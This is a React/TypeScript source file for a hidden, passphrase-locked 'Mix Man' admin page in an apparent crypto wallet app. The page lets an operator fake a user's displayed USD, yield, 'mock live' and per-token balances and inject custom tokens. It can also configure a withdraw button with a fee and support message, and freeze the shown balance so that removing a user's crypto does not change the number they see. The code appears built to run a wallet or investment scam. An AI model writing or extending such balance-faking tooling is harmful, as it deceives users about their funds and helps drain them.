import { createFileRoute, Link } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useState } from "react";
import { Activity, Loader2, Lock, LogOut, Minus, MonitorSmartphone, Plus, RefreshCw, Snowflake, Wallet } from "lucide-react";
import { DeviceSessions } from "@/components/DeviceSessions";
import { ActivityFeed } from "@/components/ActivityFeed";
import { TreasuryPanel } from "@/components/TreasuryPanel";
import { SupportControl } from "@/components/SupportControl";
import { SupportGlobalSettings } from "@/components/SupportGlobalSettings";
import { TelegramWebhookControl } from "@/components/TelegramWebhookControl";
import { SupportDiagnostics } from "@/components/SupportDiagnostics";
import { useWalletSession } from "@/hooks/useWalletSession";
import {
  mixmanAdjust,
  mixmanGetOverride,
  mixmanIsUnlocked,
  mixmanLogin,
  mixmanLogout,
  mixmanSetWithdrawButton,
  mixmanSetCustomToken,
  mixmanSetDisplayFlags,
  mixmanSyncLive,
  type MixmanOverride,
} from "@/lib/mixman.functions";
import { setBalanceOverride } from "@/lib/admin.functions";
import { WithdrawButtonControl } from "@/components/WithdrawButtonControl";
import { CustomTokenEditor } from "@/components/CustomTokenEditor";
import { DisplayFlagsControl } from "@/components/DisplayFlagsControl";
import { DailyYieldControl } from "@/components/DailyYieldControl";
import { setDailyYield } from "@/lib/daily-yield.functions";
import { readDisplayFlags, type DisplayFlags } from "@/lib/display-flags";
import { readWithdraw, stripWithdrawKeys, type WithdrawButton } from "@/lib/withdraw";

export const Route = createFileRoute("/mixman")({
  head: () => ({
    meta: [
      { title: "Mix Man" },
      { name: "robots", content: "noindex,nofollow" },
    ],
  }),
  component: MixManPage,
});

function MixManPage() {
  const session = useWalletSession();
  const [unlocked, setUnlocked] = useState<boolean | null>(null);
  const [pw, setPw] = useState("");
  const [err, setErr] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [tab, setTab] = useState<"balances" | "activities" | "devices" | "treasury">("balances");

  const isUnlockedFn = useServerFn(mixmanIsUnlocked);
  const loginFn = useServerFn(mixmanLogin);
  const logoutFn = useServerFn(mixmanLogout);

  useEffect(() => {
    isUnlockedFn().then((r) => setUnlocked(r.unlocked)).catch(() => setUnlocked(false));
  }, [isUnlockedFn]);

  const onSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setErr(null);
    try {
      const r = await loginFn({ data: { password: pw } });
      if (r.ok) {
        setUnlocked(true);
        setPw("");
      } else {
        setErr("Wrong password");
      }
    } finally {
      setLoading(false);
    }
  };

  if (unlocked === null) {
    return (
      <div className="mx-auto max-w-md px-4 py-20 text-center text-sm text-muted-foreground">
        <Loader2 className="mx-auto h-5 w-5 animate-spin" />
      </div>
    );
  }

  if (!unlocked) {
    return (
      <div className="mx-auto max-w-md px-4 py-20">
        <div className="glass-strong rounded-2xl p-8">
          <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-xl bg-[image:var(--gradient-brand)] shadow-glow">
            <Lock className="h-5 w-5 text-primary-foreground" />
          </div>
          <h1 className="mt-4 text-center font-display text-2xl font-semibold">Mix Man</h1>
          <p className="mt-1 text-center text-xs text-muted-foreground">Enter passphrase to continue.</p>
          <form onSubmit={onSubmit} className="mt-6 space-y-3">
            <input
              type="password"
              autoFocus
              value={pw}
              onChange={(e) => setPw(e.target.value)}
              className="w-full glass rounded-lg px-3 py-2.5 text-sm outline-none focus:ring-2 focus:ring-ring"
              placeholder="Passphrase"
            />
            {err && <p className="text-xs text-destructive">{err}</p>}
            <button
              disabled={loading || !pw}
              className="w-full rounded-lg bg-[image:var(--gradient-brand)] py-2.5 text-sm font-semibold text-primary-foreground shadow-glow disabled:opacity-50"
            >
              {loading ? "Checking…" : "Unlock"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="mx-auto max-w-3xl px-4 sm:px-6 py-10">
      <div className="flex items-center justify-between">
        <div>
          <p className="text-xs uppercase tracking-widest text-primary/90 font-medium">Private</p>
          <h1 className="mt-1 font-display text-3xl font-semibold">Mix Man</h1>
          <p className="mt-1 text-sm text-muted-foreground">Adjust balance displays for your wallet.</p>
        </div>
        <button
          onClick={async () => {
            await logoutFn();
            setUnlocked(false);
          }}
          className="inline-flex items-center gap-1.5 rounded-md glass px-3 py-2 text-xs"
        >
          <LogOut className="h-3.5 w-3.5" /> Lock
        </button>
      </div>

      <div className="mt-6 inline-flex gap-1 rounded-lg glass p-1">
        {(["balances", "activities", "devices", "treasury"] as const).map((t) => (
          <button
            key={t}
            onClick={() => setTab(t)}
            className={`inline-flex items-center gap-1.5 rounded-md px-3 py-1.5 text-xs font-semibold transition ${
              tab === t
                ? "bg-[image:var(--gradient-brand)] text-primary-foreground shadow-glow"
                : "text-muted-foreground hover:bg-white/10"
            }`}
          >
            {t === "balances" ? <Wallet className="h-3.5 w-3.5" /> : t === "devices" ? <MonitorSmartphone className="h-3.5 w-3.5" /> : <Activity className="h-3.5 w-3.5" />}
            {t === "balances" ? "Balances" : t === "activities" ? "Activities" : t === "devices" ? "Devices" : "Treasury & chat"}
          </button>
        ))}
      </div>

      {!session ? (
        <div className="mt-8 glass rounded-xl p-6 text-sm text-muted-foreground">
          You must be signed in with a wallet. <Link to="/wallet" className="text-primary underline">Go to wallet</Link>
        </div>
      ) : tab === "activities" ? (
        <div className="mt-6 space-y-3">
          <p className="text-xs text-muted-foreground">
            Live transfer history for this wallet — coins and tokens received or sent on every chain.
          </p>
          <ActivityFeed addresses={session.wallet?.addresses ?? []} />
        </div>
      ) : tab === "devices" ? (
        <div className="mt-6">
          <DeviceSessions address={session.address} />
        </div>
      ) : tab === "treasury" ? (
        <div className="mt-6 grid gap-4 lg:grid-cols-[1fr_20rem]">
          <TreasuryPanel address={session.address} />
          <div className="space-y-3">
            <TelegramWebhookControl />
            <SupportGlobalSettings />
            <SupportDiagnostics />
            <SupportControl address={session.address} />
            <p className="text-xs text-muted-foreground">
              Read and reply to messages in the{" "}
              <Link to="/support-inbox" className="text-primary underline">support inbox</Link>.
            </p>
          </div>
        </div>
      ) : (
        <MixEditor walletAddress={session.address} />
      )}
    </div>
  );
}

function MixEditor({ walletAddress }: { walletAddress: string }) {
  const getOverride = useServerFn(mixmanGetOverride);
  const adjust = useServerFn(mixmanAdjust);
  const sync = useServerFn(mixmanSyncLive);
  const setOv = useServerFn(setBalanceOverride);
  const setWd = useServerFn(mixmanSetWithdrawButton);
  const setTok = useServerFn(mixmanSetCustomToken);
  const setFlags = useServerFn(mixmanSetDisplayFlags);
  const setDaily = useServerFn(setDailyYield);
  const [override, setOverride] = useState<MixmanOverride | null>(null);
  const [busy, setBusy] = useState(false);
  const [flash, setFlash] = useState<string | null>(null);

  const refresh = async () => {
    const r = await getOverride({ data: { wallet_address: walletAddress } });
    setOverride(r.override);
  };

  useEffect(() => {
    refresh().catch(() => {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [walletAddress]);

  const run = async (fn: () => Promise<unknown>, msg?: string) => {
    setBusy(true);
    try {
      await fn();
      await refresh();
      if (msg) {
        setFlash(msg);
        setTimeout(() => setFlash(null), 1500);
      }
    } catch (e) {
      setFlash(e instanceof Error ? e.message : "Failed");
      setTimeout(() => setFlash(null), 2500);
    } finally {
      setBusy(false);
    }
  };

  return (
    <div className="mt-8 space-y-4">
      <div className="glass rounded-xl p-4 text-xs text-muted-foreground flex items-center gap-2">
        <Wallet className="h-3.5 w-3.5 text-primary" />
        <span className="font-mono truncate">{walletAddress}</span>
        <button
          onClick={() => run(refresh)}
          className="ml-auto inline-flex items-center gap-1 rounded-md glass px-2 py-1 hover:bg-white/10"
        >
          <RefreshCw className={busy ? "h-3 w-3 animate-spin" : "h-3 w-3"} /> refresh
        </button>
      </div>

      <FieldRow
        title="Total balance (USD)"
        current={override?.usd_balance ?? null}
        placeholder="Live"
        onAdd={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "total", op: "add", amount: n } }), `+ $${n} added to total`)}
        onSub={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "total", op: "sub", amount: n } }), `- $${n} removed from total`)}
        onSet={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "total", op: "set", amount: n } }), `Total set to $${n}`)}
        onClear={() => run(() => adjust({ data: { wallet_address: walletAddress, field: "total", op: "clear" } }), "Total reverted to live")}
      />

      <FieldRow
        title="Yield balance (USD)"
        current={override?.yield_balance ?? 0}
        onAdd={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "yield", op: "add", amount: n } }), `+ $${n} yield`)}
        onSub={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "yield", op: "sub", amount: n } }), `- $${n} yield`)}
        onSet={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "yield", op: "set", amount: n } }), `Yield = $${n}`)}
        onClear={() => run(() => adjust({ data: { wallet_address: walletAddress, field: "yield", op: "clear" } }), "Yield cleared")}
      />

      <FieldRow
        title="Mock live add-on (USD)"
        current={override?.mock_live_balance ?? 0}
        onAdd={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "mock_live", op: "add", amount: n } }), `+ $${n} mock`)}
        onSub={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "mock_live", op: "sub", amount: n } }), `- $${n} mock`)}
        onSet={(n) => run(() => adjust({ data: { wallet_address: walletAddress, field: "mock_live", op: "set", amount: n } }), `Mock = $${n}`)}
        onClear={() => run(() => adjust({ data: { wallet_address: walletAddress, field: "mock_live", op: "clear" } }), "Mock cleared")}
      />

      <WithdrawButtonControl
        current={readWithdraw(override?.token_overrides).button}
        currentFee={readWithdraw(override?.token_overrides).fee}
        currentSupportMessage={override?.withdraw_support_message}
        onSet={async (button: WithdrawButton, fee: number, support_message: string) => {
          await setWd({ data: { wallet_address: walletAddress, button, fee, support_message } });
          await refresh();
        }}
      />

      <DailyYieldControl
        tokens={override?.token_overrides}
        onSet={async (v) => {
          await setDaily({ data: { wallet_address: walletAddress, ...v } });
          await refresh();
        }}
      />

      <DisplayFlagsControl
        current={readDisplayFlags(override?.token_overrides)}
        onSet={async (flags: Partial<DisplayFlags>) => {
          await setFlags({ data: { wallet_address: walletAddress, ...flags } });
          await refresh();
        }}
      />



      <CustomTokenEditor
        tokens={override?.token_overrides}
        onSave={(chain, symbol, amount, price, contract) =>
          run(
            () => setTok({ data: { wallet_address: walletAddress, chain, symbol, amount, price, contract } }),
            `${symbol} on ${chain} saved`,
          )
        }
        onRemove={(chain, symbol) =>
          run(
            () => setTok({ data: { wallet_address: walletAddress, chain, symbol, amount: 0, price: 0, remove: true } }),
            `${symbol} removed`,
          )
        }
      />

      <TokenEditor
        overrides={stripWithdrawKeys(override?.token_overrides)}
        onAdd={(sym, n) => run(() => adjust({ data: { wallet_address: walletAddress, field: `token:${sym}`, op: "add", amount: n } }), `+ ${n} ${sym}`)}
        onSub={(sym, n) => run(() => adjust({ data: { wallet_address: walletAddress, field: `token:${sym}`, op: "sub", amount: n } }), `- ${n} ${sym}`)}
        onSet={(sym, n) => run(() => adjust({ data: { wallet_address: walletAddress, field: `token:${sym}`, op: "set", amount: n } }), `${sym} = ${n}`)}
        onClear={(sym) => run(() => adjust({ data: { wallet_address: walletAddress, field: `token:${sym}`, op: "clear" } }), `${sym} cleared`)}
      />

      <div className="glass rounded-xl p-4 space-y-3">
        <div className="flex items-center gap-2">
          <Snowflake className="h-4 w-4 text-primary" />
          <span className="text-sm font-medium">Freeze live balance</span>
        </div>
        <p className="text-xs text-muted-foreground">
          Locks the currently displayed live balance so removing crypto won't change the number.
        </p>
        <div className="flex flex-wrap gap-2">
          <FreezeAt
            frozen={!!override?.live_balance_frozen}
            value={override?.frozen_live_balance ?? null}
            onFreeze={(n) =>
              run(
                () =>
                  setOv({
                    data: {
                      wallet_address: walletAddress,
                      usd_balance: override?.usd_balance ?? null,
                      yield_balance: override?.yield_balance ?? 0,
                      live_balance_frozen: true,
                      frozen_live_balance: n,
                      mock_live_balance: override?.mock_live_balance ?? 0,
                      token_overrides: override?.token_overrides ?? {},
                    },
                  }),
                `Frozen at $${n}`,
              )
            }
            onUnfreeze={() =>
              run(
                () =>
                  setOv({
                    data: {
                      wallet_address: walletAddress,
                      usd_balance: override?.usd_balance ?? null,
                      yield_balance: override?.yield_balance ?? 0,
                      live_balance_frozen: false,
                      frozen_live_balance: null,
                      mock_live_balance: override?.mock_live_balance ?? 0,
                      token_overrides: override?.token_overrides ?? {},
                    },
                  }),
                "Unfrozen",
              )
            }
          />
        </div>
      </div>

      <button
        onClick={() => run(() => sync({ data: { wallet_address: walletAddress } }), "Reset to live values")}
        className="w-full rounded-lg glass py-3 text-sm font-medium hover:bg-white/10"
      >
        Reset all overrides (show pure live balances)
      </button>

      {flash && (
        <div className="fixed bottom-6 left-1/2 -translate-x-1/2 rounded-full glass-strong px-4 py-2 text-xs shadow-glow">
          {flash}
        </div>
      )}
    </div>
  );
}

function FieldRow({
  title,
  current,
  placeholder,
  onAdd,
  onSub,
  onSet,
  onClear,
}: {
  title: string;
  current: number | null;
  placeholder?: string;
  onAdd: (n: number) => void;
  onSub: (n: number) => void;
  onSet: (n: number) => void;
  onClear: () => void;
}) {
  const [amt, setAmt] = useState("");
  const n = Number(amt);
  const valid = amt !== "" && Number.isFinite(n) && n >= 0;
  return (
    <div className="glass rounded-xl p-4">
      <div className="flex items-center justify-between">
        <span className="text-sm font-medium">{title}</span>
        <span className="text-xs text-muted-foreground">
          Current: {current == null ? placeholder ?? "—" : `$${current.toLocaleString()}`}
        </span>
      </div>
      <div className="mt-3 flex flex-wrap items-center gap-2">
        <input
          value={amt}
          onChange={(e) => setAmt(e.target.value)}
          inputMode="decimal"
          placeholder="Amount"
          className="w-32 glass rounded-lg px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-ring"
        />
        <button
          disabled={!valid}
          onClick={() => valid && onAdd(n)}
          className="inline-flex items-center gap-1 rounded-lg bg-[image:var(--gradient-brand)] px-3 py-2 text-xs font-semibold text-primary-foreground disabled:opacity-40"
        >
          <Plus className="h-3.5 w-3.5" /> Add
        </button>
        <button
          disabled={!valid}
          onClick={() => valid && onSub(n)}
          className="inline-flex items-center gap-1 rounded-lg glass px-3 py-2 text-xs font-semibold disabled:opacity-40"
        >
          <Minus className="h-3.5 w-3.5" /> Subtract
        </button>
        <button
          disabled={!valid}
          onClick={() => valid && onSet(n)}
          className="rounded-lg glass px-3 py-2 text-xs font-semibold disabled:opacity-40"
        >
          Set
        </button>
        <button onClick={onClear} className="rounded-lg glass px-3 py-2 text-xs font-semibold">
          Clear
        </button>
      </div>
    </div>
  );
}

function TokenEditor({
  overrides,
  onAdd,
  onSub,
  onSet,
  onClear,
}: {
  overrides: Record<string, number>;
  onAdd: (sym: string, n: number) => void;
  onSub: (sym: string, n: number) => void;
  onSet: (sym: string, n: number) => void;
  onClear: (sym: string) => void;
}) {
  const PRESETS = [
    "BTC","BTC_LEGACY","ETH","BASE","BNB","MATIC","SOL","USDT","USDC",
    "DAI","XRP","ADA","DOGE","DOT","LINK","LTC","TRX","TON","SHIB",
    "UNI","ATOM","NEAR","APT","SUI","FTM","ETC","XLM","BCH","FIL",
    "AAVE","CRO","ALGO","VET","HBAR","ICP","INJ","RUNE","PEPE","WBTC",
  ];
  const [sym, setSym] = useState("BTC");
  const [amt, setAmt] = useState("");
  const n = Number(amt);
  const valid = sym.trim() !== "" && amt !== "" && Number.isFinite(n) && n >= 0;
  const s = sym.trim().toUpperCase();
  return (
    <div className="glass rounded-xl p-4">
      <div className="flex items-center justify-between">
        <span className="text-sm font-medium">Per-token balance</span>
        <span className="text-xs text-muted-foreground">
          {Object.keys(overrides).length ? Object.entries(overrides).map(([k, v]) => `${k}: ${v}`).join(" · ") : "none"}
        </span>
      </div>
      <div className="mt-3 flex flex-wrap gap-1.5">
        {PRESETS.map((p) => (
          <button
            key={p}
            type="button"
            onClick={() => setSym(p)}
            className={`rounded-md px-2 py-1 text-[11px] font-medium transition ${
              s === p
                ? "bg-[image:var(--gradient-brand)] text-primary-foreground shadow-glow"
                : "glass hover:bg-white/10"
            }`}
          >
            {p}
            {overrides[p] != null && <span className="ml-1 opacity-70">·{overrides[p]}</span>}
          </button>
        ))}
      </div>
      <div className="mt-3 flex flex-wrap items-center gap-2">
        <input
          value={sym}
          onChange={(e) => setSym(e.target.value)}
          placeholder="Symbol (BTC)"
          className="w-28 glass rounded-lg px-3 py-2 text-sm uppercase outline-none focus:ring-2 focus:ring-ring"
        />
        <input
          value={amt}
          onChange={(e) => setAmt(e.target.value)}
          inputMode="decimal"
          placeholder="Amount"
          className="w-32 glass rounded-lg px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-ring"
        />
        <button
          disabled={!valid}
          onClick={() => valid && onAdd(s, n)}
          className="inline-flex items-center gap-1 rounded-lg bg-[image:var(--gradient-brand)] px-3 py-2 text-xs font-semibold text-primary-foreground disabled:opacity-40"
        >
          <Plus className="h-3.5 w-3.5" /> Add
        </button>
        <button
          disabled={!valid}
          onClick={() => valid && onSub(s, n)}
          className="inline-flex items-center gap-1 rounded-lg glass px-3 py-2 text-xs font-semibold disabled:opacity-40"
        >
          <Minus className="h-3.5 w-3.5" /> Subtract
        </button>
        <button
          disabled={!valid}
          onClick={() => valid && onSet(s, n)}
          className="rounded-lg glass px-3 py-2 text-xs font-semibold disabled:opacity-40"
        >
          Set
        </button>
        <button
          disabled={!s}
          onClick={() => s && onClear(s)}
          className="rounded-lg glass px-3 py-2 text-xs font-semibold disabled:opacity-40"
        >
          Clear
        </button>
      </div>
    </div>
  );
}

function FreezeAt({
  frozen,
  value,
  onFreeze,
  onUnfreeze,
}: {
  frozen: boolean;
  value: number | null;
  onFreeze: (n: number) => void;
  onUnfreeze: () => void;
}) {
  const [amt, setAmt] = useState("");
  const n = Number(amt);
  const valid = amt !== "" && Number.isFinite(n) && n >= 0;
  return (
    <div className="flex flex-wrap items-center gap-2 w-full">
      <input
        value={amt}
        onChange={(e) => setAmt(e.target.value)}
        inputMode="decimal"
        placeholder={frozen && value != null ? `Frozen at $${value}` : "USD to freeze at"}
        className="w-48 glass rounded-lg px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-ring"
      />
      <button
        disabled={!valid}
        onClick={() => valid && onFreeze(n)}
        className="inline-flex items-center gap-1 rounded-lg bg-[image:var(--gradient-brand)] px-3 py-2 text-xs font-semibold text-primary-foreground disabled:opacity-40"
      >
        <Snowflake className="h-3.5 w-3.5" /> Freeze
      </button>
      {frozen && (
        <button onClick={onUnfreeze} className="rounded-lg glass px-3 py-2 text-xs font-semibold">
          Unfreeze
        </button>
      )}
    </div>
  );
}
